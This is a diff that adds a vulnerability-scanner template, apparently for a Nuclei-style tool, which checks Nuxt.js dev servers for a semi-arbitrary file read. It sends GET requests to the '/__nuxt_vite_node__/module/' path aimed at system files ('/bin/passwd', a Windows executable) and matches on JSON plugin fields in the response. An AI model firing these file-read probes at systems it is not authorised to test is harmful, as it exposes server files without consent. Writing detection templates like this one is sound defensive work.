@@ -1,0 +1,28 @@
+id: nuxt-js-semi-lfi
+name: Semi Arbitrary File Read in Dev Mode - Nuxt.js
+severity: medium
+confidence: confirmed
+description: Arbitrary File Read in Dev Mode in Nuxt.js
+reference: https://huntr.dev/bounties/7840cd32-af15-40cb-a148-7ef3dff4a0c2/
+tags:
+- huntr
+- lfi
+- nuxtjs
+- vuln
+requests:
+- method: GET
+  path: /__nuxt_vite_node__/module//bin/passwd
+  matchers: &id001
+  - type: body
+    words:
+    - '"plugin":'
+    - '"pluginCode":'
+    - '"id":'
+  - type: header
+    words:
+    - application/json
+  condition: and
+- method: GET
+  path: /__nuxt_vite_node__/module/C:/Windows/System32/calc.exe
+  matchers: *id001
+  condition: and
